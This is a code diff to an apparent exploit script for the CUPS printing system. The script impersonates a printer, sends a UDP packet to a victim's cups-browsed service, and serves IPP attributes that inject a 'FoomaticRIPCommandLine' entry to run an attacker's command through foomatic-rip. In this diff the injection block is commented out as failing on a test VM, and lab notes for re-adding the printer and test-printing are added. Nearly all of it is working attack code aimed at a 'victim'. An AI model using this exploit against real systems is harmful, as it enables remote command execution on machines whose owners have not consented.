@@ -1,4 +1,3 @@
-
 import socket
 import threading
 from http.server import BaseHTTPRequestHandler, HTTPServer
@@ -33,12 +32,13 @@ def malicious_attributes():
     malicious_cmd_bytes = bytes('"' + malicious_cmd + '"', encoding="utf-8")  # wrap in "..."
 
     return {
-        (SectionEnum.printer, b'printer-more-info', TagEnum.uri): [
-            # FYI first and final " are added by string format
-            b"""https://www.google.com/"
-*FoomaticRIPCommandLine: """ + malicious_cmd_bytes + b"""
-*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip"""
-        ],
+    # (SectionEnum.printer, b'printer-more-info', TagEnum.uri): [ b"https://www.google.com" ] # *** failing on victim-vm
+    #         (SectionEnum.printer, b'printer-more-info', TagEnum.uri): [
+    #             # FYI first and final " are added by string format
+    #             b"""https://www.google.com/"
+    # *FoomaticRIPCommandLine: """ + malicious_cmd_bytes + b"""
+    # *cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip"""
+    #         ],
     }
 
 
@@ -167,3 +167,16 @@ if IMPERSONATE_PRINTER:
 
     send_udp_packet(victim_ip, victim_port, callback_url)
     print("sent")
+
+
+# commands for forcing printer readded with IPPtoPPD redone
+#
+#   sudo systemctl restart cups cups-browsed
+#   sudo lpadmin -x 192_168_122_1
+#       # remove if restart alone isn't enough (i.e. after attempt printing)
+#   # restart/send UDP packet again
+#   echo "foo" | lp -d 192_168_122_1
+#       # test print
+#
+# reading
+# sudo cat /etc/cups/ppd/192_168_122_1.ppd | grep -i make
